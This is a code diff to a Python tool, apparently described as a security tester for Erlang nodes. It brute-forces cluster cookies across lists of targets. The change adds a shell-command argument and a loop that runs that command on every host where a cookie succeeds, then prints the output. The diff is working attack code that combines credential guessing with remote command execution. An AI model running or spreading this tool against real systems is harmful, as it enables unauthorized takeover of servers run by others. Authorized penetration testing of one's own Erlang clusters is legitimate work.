@@ -26,8 +26,8 @@ def main():
     # Parse args
     #  [TODO] implement custom argparse formatter for epilog
     parser = argparse.ArgumentParser(
-            description='A script to test the security of Erlang nodes.',
-            epilog='Example usage:  %(prog)s 127.0.0.1:12345 MYSECRETCOOKIE')
+            description='A script to test the security of Erlang nodes and run a shell command.',
+            epilog='Example usage:  %(prog)s 127.0.0.1:12345 MYSECRETCOOKIE id')
 
     parser.add_argument('target', action='store', type=parse_str_or_file, help='Target node <address>:<port>, or file containing newline-delimited list of <address>:<port> strings.')
     parser.add_argument('cookie', action='store', type=parse_str_or_file, help='Cluster cookie, or file containing newline-delimited list of <cookie> strings.')
@@ -36,6 +36,7 @@ def main():
     version_group.add_argument('--new', action='store_true', help='Use new handshake method (default).')
     parser.add_argument('--verbose', action='store_true', help='Extra output for debugging.')
     parser.add_argument('--challenge', type=int, default=0, help='Set client challenge value.')
+    parser.add_argument('cmd', default=None, nargs='?', action='store', type=str, help='Shell command to execute.')
 
     args = parser.parse_args()
 
@@ -43,9 +44,10 @@ def main():
     if args.new:
         version = 6
 
+    good_hosts = []
     for target in args.target:
         for cookie in args.cookie:
-            epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=args.verbose, challenge=args.challenge, cmd=None)
+            epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=args.verbose, challenge=args.challenge, cmd=args.cmd)
 
             try:
                 res = epop.check_cookie()
@@ -57,10 +59,22 @@ def main():
                 print(f"[E] Broken pipe - is {target} up?")
             else:
                 if res:
+                    h = {'target': target, 'cookie': cookie}
+                    good_hosts.append(h)
                     print(f"[+] Good cookie! Host: {target} Cookie: {cookie}")
                     break
                 else:
                     if args.verbose: print("[-] Bad cookie!")
+
+    for h in good_hosts:
+        target = h['target']
+        cookie = h['cookie']
+
+        epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=args.verbose, challenge=args.challenge, cmd=args.cmd)
+
+        res = epop.send_cmd(args.cmd)
+
+        print(f"[+] Command result ({target}): {repr(res)}")
 
 if __name__ == "__main__":
     main()
